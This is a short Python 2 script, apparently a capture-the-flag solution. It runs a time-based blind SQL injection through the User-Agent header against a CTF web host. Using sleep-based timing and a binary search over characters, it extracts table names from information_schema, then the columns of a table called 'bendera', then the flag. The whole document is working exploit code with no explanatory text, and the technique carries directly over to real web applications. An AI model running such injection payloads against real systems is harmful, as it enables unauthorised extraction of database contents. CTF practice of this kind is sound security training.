#!/usr/bin/env python
import requests, string

__URL__  = 'http://ctf.asgama.web.id:45001/'
charset  = sorted(map(ord,string.ascii_letters + ',_}{'))

def blindSQLi(mode='', table='', column=''):
	match   =  {'column' : ['column_name', 'columns', "table_name='{}'".format(table)],'table'  : ['table_name','tables','table_schema=database()']}

	m = match.get(mode)
	result = ''; count = 1
	while 1:
		l_bound = 0; u_bound = len(charset)
		while l_bound <= u_bound:
			m_bound = (u_bound + l_bound)/2

			if not mode:
				header  = {'User-Agent' : "'+(SELECT IF(ASCII(SUBSTRING((SELECT {} \
					FROM {}),{},1)) > {},sleep(0.3),1))+'".format(column, table, count, charset[m_bound])}
			else:
				header  = {'User-Agent' : "'+(SELECT IF(ASCII(SUBSTRING((SELECT group_concat({}) FROM information_schema.{}\
					WHERE {}),{},1)) > {},sleep(0.3),1))+'".format(m[0], m[1], m[2], count, charset[m_bound])}

			t = requests.get(__URL__,headers=header).elapsed.total_seconds()
			if t > 0.3:
				l_bound = m_bound + 1
			else:
				u_bound = m_bound - 1
				tmp = m_bound

		count  += 1
		result += chr(charset[tmp])
		if ',,' in result or '}' in result:
			return result

def main():
	print 'Finding table_name ...'
	table_name  = blindSQLi('table').split(',')[:-1]
	print '[+] Found table_name:\n', '\n'.join(table_name)

	print 'Finding column_name in bendera table ...'
	column_name = blindSQLi('column',table='bendera').split(',')[:-1]
	print '[+] Found column_name:\n', '\n'.join(column_name)

	print 'Finding flag'
	flag        = blindSQLi(table=table_name[0],column=column_name[1])
	print '[+] Found flag:\n', flag

if __name__ == '__main__':
	main()

